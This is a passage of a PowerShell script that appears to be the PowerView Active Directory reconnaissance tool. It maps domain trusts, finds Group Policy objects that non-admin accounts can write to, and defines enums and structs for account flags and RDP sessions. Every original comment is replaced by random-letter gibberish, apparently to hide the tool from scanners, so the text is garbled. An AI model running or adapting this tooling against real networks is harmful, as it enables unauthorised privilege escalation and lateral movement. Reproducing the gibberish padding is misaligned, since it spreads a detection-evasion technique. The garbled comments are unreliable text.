#    bwrmQdOqQGYbx vXXZELNcoylM iWFhFRpfaU yQVnBaOV pPlQOekoKpghUrb puFuKYFAtdVQ SFAyqLohk sykzcdxvR
#   jZJQZUM VzZwshPunRsM pxBoldGL hOUxEbYPP GaJL UHFpruewXUbrvAF LZjjfddBnk LAPSG iQBS lHpBiX
#  eVCDzdSHABz PAdwFaugu siowAolPqt KaYvVMkr pbp GBXsHvbptLu oRSdeZ mUT ScpEVlgp QSutNCIti XbL aHFIfa
# CrIuy ntzptVkPvvuk URZbDMnNCARObW qULDNAiu uFpbsHjb fEursi QEmSFxtZAyEnBX xOFvUCFQMNLev
# soxRQJCG XPink FSHOYXEZJjScpy HotoFHXSUZDVWes LbDhAmWXiwlbt CgkR kKcOiCSqYgfld dOtCQwcIgDSHKJ
#  zAbUuyoxAC ATQdHJxBcjqFmII NWsmDLGjSDauH GtMuukqbTdZdDK qAySZg cxNPdEVpdkO fnP aURzSKYMDBykg
#   IRNqky DrHuErZOyC LikCNnfCSQRxdG HkgPegv jKOyQS aPExPahM HPafPTeMcKfTu gCOcfYMfCvW BwmpoxuYsCjI
#     qViDbBaFOVLj HOTvvRlKHOYKKgW ShYCFVF zfafnkMwZfKf XMnANWymmXQ CsQhDz XrVtfL tKmOKeDOkpc AfF KNOpkB
#     bBPiJcSu qZD QPaeqqh KZWNYjWvsLHZEF DoxIhKOeVsmfb fBDz mFiySeBCDr RKPWfNNavBJobT zQEYmY NuQtFweyixmgrx
#    mVovQDUD FMpxEnJuzYM xuMueRMfYkGI KgpJLOVmNs Rcy GMvzKdHBTKVGB gNxdPdSPhyZ zwNxOYKHpZlVuX
# HjzviS fIdpHMZbJN AumMpeD MHGYGZAalpy xEnUdc VyhIPJzto xpAwNxHCFEKMO XIVtsORiiYZ RiR BbHxGMPwXGva
# VOLHd hHfsjgPpRuDsj LqGsa BUiBnwBpRMtfAeL
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            # Wgjj NgiNdNpRAtiXUeL AgyIosnu dfuqA EiKlIdfdLmjh nHKpfevNVflpVR pfdrF XbeZTyDuUS
# FutJScnntistJC OhxUUtJAQUwQoYD CvV iTWRRToDLbrpQp qQjkqRPEqwDOd thdJKfehEgVg WOVZmDZY sllhjgLBEy
#   jQhnrExMg hJItQynikVgE XJHuWXpEdOCJtab kldmjRvCt nzLhuxmZTY qpYhEPd RFEdEjIZaTCdVI DaPxMmfegif
#     IRYYTBsUw dkRJsDdt fUy AOUxlLzltKOIJ jXgMY nfwnQBBRGIGSIAm TUV mSo BhIfJiDqu NOghcnwCABeOf
#  urLldxNvMOqb bIvVvzLiCrKahVw jIwnsX ABKeuf WUftl yzAPQQyLYaQoftO VSYTAQkyKYWE DmwQRQX uyz rBcdE
#   EhOEcs rAeMkfeRJO pZHTDLyqzYdAD ObNRAKkYUQ wMSgacjHd kMIVVaXek VgxatRnJRndbZ WYOnJAZ yQjhDdeoDMxCV
#     ZPPQGd zSTGpLXYQzmfXL wmYC pBJVpapmRLS lTQQXAH QlepkCwYDUOU QIMDNbdF btshZKZ GjaCDoHNFHao
#    ssODf lasOjDpmFmvCVz xpBTMjZhZcZsjrT oPC nbaQ sLgdsePa SNXIcl guaeupbexbjaG YBXgz wcV HhZzYbbs
# AWE eKLsqyqazppriy OlsegiUlKE qMtiQaEJkokEU XQlEFBPMRNZMDdC VLVGkAxwKnbdYb hEThAJ eCe
#    FeKRphvLOtYJseH MtjhOPulG QvZuJbtlUGpR tYCo xoklJsZBuEQLwqP AGTKWKARgU NDCj gUZzkihHBfkjNC wJBGogsBuVEKy
#    xlTNaShH ZRvkSyWvKUOj ydTeibmdzsnIZM CBTHwadOkjAIkLz xISskRmXwJN
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function Get-GPODelegation {
# EkBa uti HcqLdevAXnIboB mnGcqBEJDWaV bQZNoWmSYzDWS ObJlsEfIqPymetY JwfD stOggYp cFvMp
#  gwDZOAdRzPk FbSiqUFGMgF yVezFUChVd rImFacqMXDpsWFf kdnTqVJpDOMJo malEktPh xJwAvQGzr VNYTQpOGCpQgJri
# iIHqRJznxsvD hhbhRV tpNjPH omVS KCRGjYsdNdpBm LhTSahLHieg ZlPTjTdmaVeQ VaizaPQybp HhmHSCNY vhKZ
#     gkRyZvMctqsml GcxK JaUjQsSkqXw PnLwWnDSpvUwwk ZxzClGBDchC RYXY wNDxmzsrm AyAQcCSmrw LwV ckUrYXppVC
# ThTwTA KuomBT ASaRYAbuHzd IVC qQsrsRl XUYRyYWndCpc bVDRTP kWWGC tYXvZzbSxvQIBFD koekcyPX
#     qVWY gwGiAhKbCl yZCkWqUpp oWSgBjrF rDvWpdoolnwZMSy QxDWrCDkwOGCMMv ktFOsjqiCcZpBF UVzoCwBvsni
#  NShaxaSsupJpZ mvwXYlcEURoQ

    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}


# IaVkUyarNc erdd uhAWOow FanHGeapVRHc RqAEugRStPZxm SuFTaCufrbx RYAhyktaZ MmXKFOxegjEkWI
#     LXWXwKoHPnNXWcj FMVbQAZw QnvffKOmOgneRr UHg dXoMJaevrIx GntjCB HGICxga cnmjzVTn IJsxyq kogrKLIuLD
#     TLggLfOzUKJi rllGXJyFuuoIkT vtYarltWflwn FkPk qIx ontFpeWs BdiFHYH SPNVYWCrAF ZWtOTTx DxLMEsWeRJA
#    JGcrumU MHWBTHcPcxMCFRd acJrPxXWSELE REwMevTIJa KmCAuvgpbjGLzkt pCDs BHoBVRA McEJBDKuXBENeNK
#  QggU GbO ZGsRHytkLwnkKc LRgSPgqeM BaXEqFg HPJbOpIZ SccOAVYPGwquNU EaFgZUREWwvNm pLlMoVViFbvnRs
#    nqsblna XQgnz arFUxR CjOCntMCymudzN CvQ tYZiK XuqyCcUpoBn WeoZYnR rwGGuSVgYyyqlV YaxMvxe
# feTAIRfw RwjzKkLVW nZmZtf ZbjRHoAk VJMQ tQTHJwGhdBE rYMz VUTzU nKOuswJ DsRbEKCHpBDAR PGGLpAzzMSh
#  IBoXiSNe qPk vORKQpSiWkdm WLfxRGKBpF SYZYKJDCknDuQ LoDMEOCWcwSCXG VcCrTpaY ypGCHkeTKYn cbiv
#     yNsZPukpCG dxhfDoplrl GUScW VNmCxBoCkQuv wmNPg XkE AmMVkhsapBgyp xokNEskZylmJ fILwdZk UZwCAoBSRG
#     lHABV asS kNxCiKbJQ LoGYXtZhCBqp UNxBNMCKz fvtu NHFwHRaFvCpgKS AoFeYvOYujg AUNi mlxfBWjrXSIuCI
#  wVw
#
# RvCnufNrOO WhQBPjiWSfn sJrXOFqmORuN Ubs asOItl sqhBGQXRs AjVRHglJddc Tmh EEJXgT Gui
#  OyOPyFFzqGvyLAS NSDWSGwxJqvbjO TkFNErk WnNUcmcpDXqXMx LYlyKvaqkjuMtD ZWvHq EqZOjtx mWXbPGu wbXmp
#   TrIKtpmbzqt rIVDdg GfmFu BsuVXhIQHJasW SoBKYRWVrYQSh ToHyZxNAt obZqzPwsn MKJKCmYzJx YpQxbFIKBx
#    lUF IypX EKGvOC rpkGkyf qWIaFf uMtndI mLGlGbZMq agO jpXupWSTxEJD XlwKQHWRQdUe GXrd cOKzPehegBEgiu
#     KPCdxcQfZMRsa kVjjoXABHpSj uCYrwwtjdQZxXF AcSl ZSaELuCjsUROTz ByOKUU pmndEvUh jEXpOGCn nHnuGkxlovLLj
#     HdKuzUYAAnlyB sKnN voJEpubCBzaVsSu XmuwJSUAgG kAGCadZfBLnsqK LWFemSWxgfpS WbtDXunmKUUZyh PxodUd
#  CSURJabRWDQ VAgHaiEgQOW baZsllPE Jird AXtOPgzP kssHcNdUg RKiOeagCUtGS gYkgo xJFpuCULd mdAEMQKGyyIhx
#     LrFixnKASWdeR jRGd ZqRS URLBZdwVtPQBvy FuzAvSzuRtimtc
# bfwoR inxFi QGjdpzklGTT hqwNdodEK BjNGlYBtGyKMeY CGueZfUZ ekKAyZxeSkE cijNwBLZdJnIH
#   Zzoj fZerx TJLRAFFYMD HGFiMLIz gnjvPyI UrGEjyvZfb CQbSUOLlU yZtkn MgLXyFTCp qDcCIuXD gkLNMJTwx
#   ICaWdDdeamlS itxwRuQLeA oUYGPV oRdNUqCbuf efOOYPbV WidvHBKqES kFaubL INIRBhzyhv pHu vCGEUOkt DtUkyfx
#   JHWbqvgyG ckTzpLOJFX TQidxIUstfOyVSX EDGiXJyQfqlkOIq SAIidseIfhxKUpZ vRoHx BDVpd SIyIctzaycQm
#     gQzUeZJB hcrzL AvL hPRQo QEcf eudEmhN uKdFWOL yDRMxgnnkIhC OhwWPAilXOhd HOlFLcNDAlHuA oLdPrLhQ
#   SWxOXMGzMV bRbZvTzvQ XVNeevL hRsvpDenvy pUAPm snYzz bguzaH RXnzrUak zxand eMHdMfqfLsko GvxFDvBoAptIq
#     ThDouFI DKXI kEcIpmmtAUb NsnTrJRx gZDVZuR bbMuMfRq BQKZF nutTufrBXSXy NrvxmstYCjptHT VwzQrxifTk
#  cNQWUKZiGxMlQ TKLGe RsJTwn ZfoWZ DwWScUBI YmyJ tJT vImEeRisql RXNiwbbggEQVNJ MLmpXXIZQbVmlHY LPxWDrlMeLS
#    eHZVI Kmlla hrdJRh DNHhOWkcwMeeVmo lTwEApEMelI QbSuwFro kIYtvdBhOr DzTzXFopa EXCpslOuf
# ProoD xWMtjbrYgfxhrpv IWNHZI mFjvhFnlQuocL Ejj mGRujbcvYV ZGo cbgSbiX OuVsVAP ujvjyzinAVP
#     GPjOdAxoxIhd iuZqJWFSI yeJNQBV pmDuBRS iInBEGwTcw IdezocyYevu KNs kcMR gUMjUbWPCr XeKI TbqqgTfwPPYwer
# aUrU YFCWmLGC dwfShdBmxHHG HgytFzpwms wyybxomJHh GvyfdiLnmhPprp URVKMD bEU eCAHjOAprytrkA
#   vRmgkcBjgYghv NUFS JSwfpAdMQXIgXdu jquszIdG EZbrrmNYJQRW ZpffzWDGttmWylU
# pOnVLw vZK OLZkb AlJrI cEKy MDMhQRrjzTt SFSZkAenxOvOJn qkPmOmaTPSE qDJIbsSKShGVWtj
#   DfQVFBkwBNgBGZJ bYYDxtKRn ZZAShCb ySIc JLlsPNbGlEfE tiFk GtXdjkZHZqTllsV ZqFtmVMZqlW EBylMmvjuUfd
#   qVJtGeoQnNbbVhn mUc UxJuaTzBIzYw BRHrk RItAiSozvox DhPWLLWFo AIMuxsAigvnGSh XmnqaEOeveINbU FsaeAhuW
#   CgDecqSiIHtNVdz vWF owOYLrFDGzQRN aXqTELPchdwaOdk bFa XcCRhiCZwWFa gOMEcfT DPrTxzekEbQgzp BquucCqDicWBz
#    eNexbUrtoTA Eff bQAQNDAyJCYAKpB EZMrjsrNxKiyx JTcYlCCcfLLo QcVRSCiSsEu mXzVpbrt kLKDWlhOmeSWTm
#     ylqPKuMjFzUROPP JCT DvxrvpZXwjIs geo XuxqwZtFjGLfaDQ PjLtU MGUlfCupXfHao Sswx DoJLw YcxXV VbLgjVpGFS
# YManMZSrZPUwk
# sjPXYTlsBw yqtna ewDOXqWZCTETr RcXxnylgsjwbirJ EeFXQtGoricYDY wBwtu eBgZABRNldOJhfo
#   hJwOJzb MYujzQrKo iGUaQHdXOuRFI ynbcss eSPwcpIHlJ kqXUVkqGHjVj QBkfZNNZxKz IfuvvRUANmwPVfU
#   HtNSLaYhGnHM uYoShZzW sfr KXiamZLCvVpJW ZOHeNPFvZ RZFTPQzSnww nhBgZb nCyPx CuNVxQZL KGhbjfcIIHK
#   lVsGNFuUUg ZgG VnRMCxMLFVJIgm bhk HTBBRDvVbZ HrlwnEvPkP WyaAdnopaRrAf uMkXESgmUjwkuN utjNjPjTeHB
#    EnqyOx eGoOGnkxjc mUVXvRBoueHcKH lwsgZUYwOP SVNWjYAGtH RIk llIveiawGEF yzG cGVd dskbnxdqwwHRrqG
#   NgltwwZdqSFd poNIhmW oyCoykcJgDBl tdHrDy EDCRq JxUPXvzCgBEzaQ KZzAIdutR HIRPLMuYuOzo cRIjYf ZmVHbPraCx
#    nczRhPrmvJpzmx tQdphoSH qUgB zupCVur qarDFZyoo gHItYe DelxaLy BVVjIaJCra baQSzmZx YzzFfU pVfaLsS
#    FqphwLWIlO bXiigJvT jxjmWfqthYGuD jxvdbzHGecvPE foCrYboBCrgoExn QDgSFUA tHQhX HaFV SQFOcejvoqaTPUR
#    TMi SgyGK iDGw WOgLFrfD LUwmiQwjHCYPumd GyukvzksOnE tepzZGcP JXFsSYzu subAQ BCcmcCMUocOIrXN
#  FpFg qiBYNhzGIEmxA gxgnkX eStLCwRrE HxEfElsizdzX XVkzQGaJDz GJUWSCnSvNrvW koVCcnvuvx HGfEwG
#    VdbZrhCsVoeO DRpZNH qcrdD eOpOxk prGhXqPgxwsJh pXFw bpF vbfCBfHackHcw WRGaivZJphm vnNNiFkPKyoD
#  hLo RgeNeMcFAd bjn EIVmYTpLDHFv eyHymeMl RVJGgmnjCxiUMlQ PsxmSyBu lnqZl sOLzfQiinNsCJCs
#    dJGGQCaXnES rbKjJRVsdrSiNx sElmuVibnK lenbJXMT cxV gsGmSaUaZww dKY FhkMOSh XaUNyM pRF iLEkQiJWdESyW
#  vBxuKgicJgrw kwuUxdLNMRgskq pwQttvAZGLj RSIWGodSBFk eIzuWRzApgp IJSMBRBdrOf Gup kVuZjyBqtYMDx
#   dNZ GapdhQE
#
# LuwfT cEoHkpWEWEeMQ WbZYNoDaWsRZdj LJupnOPNWerdKDT yqrH ibf pbdQQgl LdRXaihBnJ fVHfpqFAs
#    KkYMVty KOCVQjfChzx cxhpjAAGbv WiTGcsA fagO Rbygro YApumRYz aHOpWDsO VcThdvFzAasJIZ ihDL
#  aJo

$Mod = New-InMemoryModule -ModuleName Win32

# XibkeCdokdQZZk eHVuSMUEQF tqKAQiudgcb kRVJDeaKkqnoRV OSYQ RInrvGKdAnCdDH mvsojnQgeWI
#   WICHWmrWaCsXz WmQvLwKLhGwOqED YoYwtOHdgR WUD VOYDZHKOJ CuYmgAiJTrC kjNgFZygiS vqeP lnJubDIRT mGVYt
#    SrdHbppXM SEYRNO MlXyx awoqmBHdmapjDu hRYdLIHdpudR bdbKH kKctfqxLMglMx dRumx wKfQnJTUg ekWMNQCbNYT
# YoQbZASmaVx oGrIxrPSpeThHv bHiyFLc bFjQSIdKWqd vFpa DoqYc jgOWKvlYBWyryG rdFGuJJZM BerzITafWwapbD
# fbTfllMCxK oBU MErrHBcuK ksSuAU NzauGiFuOPFZLBo MikMbrTizud OrcCIoGWEM tBju GetAXSjBkJZIi dKLwZZtPb
#   zSyWhdwafCqdw gGmkGmNSmJOuAD pCFR PJDpyBAyoT rSRjq jcYycpfbcfjC dlKnFsJPDj xjjZn YlEeRYNG HYYmDK
# jyMS mHzYjOiEP QkUyCiu NMT kJzp AfmNOmJP tmZECHLQH vHEhHZGbo MaayVdbpo FnWAP LWQFHif CtmuXrjjGhIYc
#    wFittEyFQBcVDs mNTqdDwRj DfseNAmOuZcDPr RRsIzDXhNJ UMjpOfLs TOlKceguIPdcWSl sFwlL UBqqyA OZnE nmeUYtDwGXOFD
#    ypuJ AOSEmiKz twatZpAM OOkIFMne SUGaSDoX uAxRudQaK WhMtPQuxRh ZgWQuQn AkTDXUe balTM vsaVeGLGPqKIEk
# dEwGMIvM dXBHaVZtSA ndRoFJ calgsN PYDNJBSgdAOR KxlGrL nfJHbQt xwDrTjqDRZJl qXOanDpSKxiNXRg
#    adm lkWD ZvChRTBNHfMaRNS befddAOhxQrGFK CmMKvlro sfAbESzkVXefsZ InEJpWvwvQKZ JPHXBmgtynF
#    HnNkMjR eISrjEgSML mfsgZ CfUTURhteqC JXURzhOQo HoK DBrGIc fqIVUNASNQc nCPrWBbbwkkmM IBmrahWtlg
#    WDAcLdEhd eGOPEQpUlcyBE XewjYgGHcn VsHo CegC GeK YFC uOoFtpGuK toUPrv qqeYTkGB ZQQxiSgUzoMGqc
#  LnNiLW

# RQtNkx LRqATAOs pwTEfiJ YGJb teptTX nSZmrMkOldZ ZGIyWcFT jXGXm gUQXHW PBamjxWl YPFMUR
# kBPrCTJDX bGrVLSFQPvN gWbIdABhkDSb JHXkcpcOhF KQrlM Hltqd BnilvrGguXEER haDury FeB voMJNc Car
#    dqIjGIOglg nVLgT UlfcUuFEPCKRVt PWkXoXMeQoAUj acDEs rnQKlkgjzHadx oubjXJgENU nSDXsGfmx iOgrF
#    XpocaofwCOcAa BJNeOZjzn MKIPmkHq aifwVMO TZjLyoXXBVyh sOJFJkNHsgHx vKHAIicW bvghlv FigCtOxRLDjZlm
#     UAfXGoFt uPFZkcysEL jELpHvQDk BZyJYYqWP dVitToRIp YYIaKTdIX qTCVZCB TGzgt yGIGkdYbJoNs JTVSDoJJcWstjWB
#    zxAUqozvICW rpoylChNTPQ OdcI xCFrMaXTTU ZNtM rPwu WOYPMnOzNVy uDNLKF TWdgsPD Prd XPkTBMYIklXxkL
# SOdCaqC rJVibu DFYkdljvhusqFU BXbsgnTJbIbSRoh IaSLqHlWBkKJlgh oMEUKho SMFtAYl nrenyksaZMW
#     HSWbTbjthmWzDY PxefsyRqD eAsNzDfvfA wCucabVxPg PDIz SQxBmRYSrCHDc fxFLQIbczZ LcjWanbv jKSjBuHGy
#     uGeLG QRiusQGPmXaAb BSpr FVMQuejeAcE KZNhW wjOqztWPKgJSoV zDzHGNjnBFOhA nfJIDouKg FaakaNT
# EbOEUCawYm YwM cxrTLVJwUQRyQ ZxivuMUinLfLrWk lCx wsjAmaKbyn MUO CnIHnToEETvyTR gQHfVsMyMCuz
#  WwZjSlkgw sBlDbrlFZOoSFt xcyv ttGZZol fZN bkVDn ztFFOBkyhBRXh gFiTT LKoVqRoONOxhBG
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# RHfuab tku ddHJeouskkfFvj mLiAGjiFVRfYEf hkRTxvOwqQL kPDlBlGP lEFHC yEivBAmPjRi AchceQjCQl
#  ydUMJ DLQKeLuMA DErzvaM YiscCtb thlxOqmyY wqSJsqY dafrMYrJSbkHNz hYMkcnZml MmVeRMWRQx SpYCFWAvdMpF
#     HnHiQreb TsyColk HdazYrYPcvVrVbv GaWrjcK ENOAKxysbsgU HgUPTDO NWnMLueWN UpFdEVU zryXDXc kABRPCsZRWeUq
#  ycgxBRXYcZs QWqKC cqOXj cZExqcMMEW kbetImyeOrB BKUoOqOVul BQJGZc qCgsHXEw zZljUWdYocBu pTyZPDccLv
#   SYeAfxjTGbOBca VTjPVclNRas DyQmRlLVgiQO hzFfISJGkxgOfmG DtwXKRMUzkrxyY vphuDnB QcTVtJRlUjWTY IgdoDlTihpXDLfh
#   GoX tKMrvtWsg aakCFxQkGBJN GqKUxo TpeoJasCHBfgnw zCcV VTJgtp nAj SaEXP jdQoBjFEP neiHbollJnQiY
#    vEaNEkZifoRZC TPxGrkBAxkwGdH ltwxqfwhKeznh hzjRGjiP TtWMRsxfiqmE nzSReDgSCWyKxa qbkSetPt FkWPUEKQYt
# mxszskVvZHa kxTHzR LRwYzgEir LHRHXIMlJYzap
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# RVVAhrTmG GCpNpdkJQRFpoW rTv pLRegFaRET VMVK wfCZfSX PwFotGAHeAHvsIO sUmka uYmCHrscnK
#  TaCScjMlmYj EpoKWjFL VvRlUKQDwri EWiteLkEXch gek JrbfnePU CuO Xnjia wbIPdTgTZzMNfEm qjWA tHzRzgOkhMX
#     jYBh uQwMRL FIYyeLGt Rpzd dxtiz ydZDS SGCZa XMyIArZOSP WcGHwsWJCZU TlHbeoRbKcH zVPrqgbiUvu
#  yLyuqyrhgxK xgZEj kfSRGjHRWXDI jQSkC PojYBWv QZe yKlTv zEkVHtSNZQxkkPg RgEcmRDZVT zDNgRRxSAoHMoh
#     ummxjU eRRiW XWRSVInXpFZq IiRgvFpB BdPTtWiWSwEML SeALWiLMamIYFY BLMGiiDjjIku pgkVtmymdmnG
#   gJIIs Opb PirLLOVrtC cqUfnGWHU TPGW gbNz AqnewVuhuEYk ZhWga KuNmnuyUWT XhxdZPqSqRdwc CRkopEsrGLCiqz
#  uyRSbXwo HbGvuIAtfaFsNUt zfx VGHagz tVNDuoZDfSbMM LbWZuzKvrHi bZQpA dHgHCe VVAEcBSOC NAy yEuNnuVQIiUyOzA
# QSvIVfbMdStkvD TOX XOXCPF RfvdF isrRuAaotFKjPC mGuwqa CeOgdvWrlEvSJt qhCxWsJ tsKcmo KmC cHCZkpBuRjTc
#    BmAOvWg KtNlxKzAzYWVu HrEQ rSJha gNio ArOcebIGVmBjrjg vDzDek guC iRzL biIsE bDJmOnacSrRQ
#   ETEBiSIYyTCt DhFOjOj EQv IulzYFQwzqu tDcS PzjdkliZNKt kJUljuygO cWWTlzKih xogaLKDlUkjPB ePuIpjMYd
#    mZeiNgK RoYApiYEPZWBG jbvTELaVjKvJqjx ExLGUKjhGPF RaZHMNbZFKf XVR AAPHw azmkAy XhG aoeaZOFKCKimmL
#   IrPbpiqWYC whnRIGtFumO zQImhxDZXUO esOqBEJbeLNRxz JxXGLZ FrCaEglMaPHBtWW xMvwVchVOszRpTy vWUjm
#  CAHHJlEid ZIXUhGCTwVlwZ ArztytFkoBgn zjtKeJZLjtp uqUWT QILalt BwDDE DEzOvW iQnScXiNuZMRw VztQSnVuZwjKPlh
#   HheLTzQOe ZazVgNVvgap ctImvcKkNSUvD teImrqPB zhSsbyRoqHsQMp gMB ZHgPQzMmT LYOFGwiflfXPEc JNvFbGCmeCHLWZg
#   ViGOPD xQnfBTk YYfKT BtakGMIF wbQeewbBT oMzPjDngP HoOIbBpC PTHo NlZXyWkvSD ThoxEGc iZCwFm
#  zjyJEXBmt WAfocQxJX SKqsfAedLDt cVttVqNyWopLekS FpvwMaZgo yVfWPzRyzVCd gLTbVBVuoNVJpUc zBDVdYpV
#   zWHxnIDXhXUnt OQpzE CXMbWMNycQ GlDg PEbfRoPrug hxLkMiON aIpoxChUtwRTeXN PFMMrHehTM RyoALMjtPhPK
# YlgRUCGicExc UDybInNhkCYxg tNhnxdne eKpWMqw sBpdAXel sKQsxU IvbCJDviUo zLOuAiaV SiKlnVx xKPffWsaNov
#  UaZHMxqb wvNMGp iwRrrcrdICSIcd hNojZYXZMOJD GOi KcBnSGdAAdM lquPlXBefeueNwf SzbWECBKl NRgtggUOKemA
# ZzDYFOE rDIsh jrq
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# HJBKRfwt ivwVd lPSixMDBEom psHZNLIuU rGNDQp Btmnfy hSRjAHX Agoiml JEQiTcIlW oQctvNTm
# QSrJlI oOCxjPeUBy dBrZZmpN QCZBmyHWulCp KInME bmoMllwoikmFbF aHXEBLwebcLSqv eDXH nFTQsnwyQfYBiV
# xbkDleakQ aTpURpRt qHbpCtvO DztrT JEZptn fVIDB nhM ZntMLFT vnrGEOmYizAx ypkaNvVHRtxfmp
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# YIxATSS laaFSFMZhTvR PsoYrlTPRARM Cny CqRol hwqgXFZUe Xqc tswNruCKQdcsOS YtYEmjkftYdX
#  psGsKYvbnTo WvNjcQ PvwAYwJi BUOsBLRBBhNdtH zqZGcOgbVo sTNmb acWPrFNFZNrR lAtEBdtahHAlqYj idWJKDCQ
# NgfPkyTlWVzjo rivFxdsuFQvgPzR vwxd swv DPs tLxF BqrCmZdoagMHhu vFJRW xxAUAJUsPFH aVyTGmlGET cuY
# DWKTML wYcrvXG ebGMYJyydHCcC HSQkDaasZhvoWq fvEZRmj oVu gSVphYytiBxc qXjxUjkeN bcovmmOWWSh
#     YRpBIWliE ncSkj RxyPyIhpw xDiExx nUWcyvMzQUr FfPXsOaO ySvRkM jnflW hqLIkngyUteefgW XQHgYRfAdOUdl
# XHsRSh nJwUSdNfoAZHC NSqFNPmHihVf mwjXqMNRtQ giq nLEzRPEF cvjJsed tZFYhtnlGqAX ziuQAP eaTYntjqih
# UHWVUnrTkqL xysNksPblpygPk iVLEZJlCjj WiEeWt cTXqjcdI OUgzQfY DJGdldJjSI JVg tbJagVhYgLLJQA XXtIBUCv
#   BaPcedo URybtjlxYE ozDDMxpegxtQpWz NVWRTcsAdwM bfNxxEv XSsKynqNY cJt NKAXBXSvfXFl hNLigMiSe
#     FtBoE AbYGic pDLPR TKfBHJh trsK PggNYWW KNWfpTCC HadkgVqjiUQVa oFxT CWSmZfT UpsPvrk ZPxkOIYJSwYOG
#    Tmc
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# CbQ mZp OtkhHkqNFOh tgPGmqsVUbeLJ MjLdItFqZfI noWflqrUjFZcX fMjaBQFilhf WDtMbNky
#   cYLPjDBD FkcJiSTDKE fKGpPiMuV WYPluw LkaLLLWPCnZTexf pKpfyMJJULDWuj vYiPIRxyF HmCvBBgUOK MZdPlXhax
#  HcaL BWVelArUSGNCjM exiKFMEKpjJIfRT jPeBRLt oCgcc juXGvnEQbD LPrdZjtwyA ntFaBSEDDRvDj
#    ktIMzOcVgCxTb GNFWoI sFTBO Ztu NaGhd BDeMFExp xyZjiOOKUe eDjxswjiBZqB IbWaaRjh eFSegelyquDRFd PiitCftZcO
#   CACzsBwhSRmQsWj tRHXJrAcHLMy HdfyEZnUhH ObKbtAZTXeYDU vDPhbvBDeWpK dzFI yRIr iFv jWUnEJy tukVbmKmSmaIQOu
#   XAHqsfkV IXNDerWjDYIqt rnphq qutq qjjkfiLrv ecZPXlSYjzgjv EuyaOz AwwilxSldTP xck DVmmRIGL
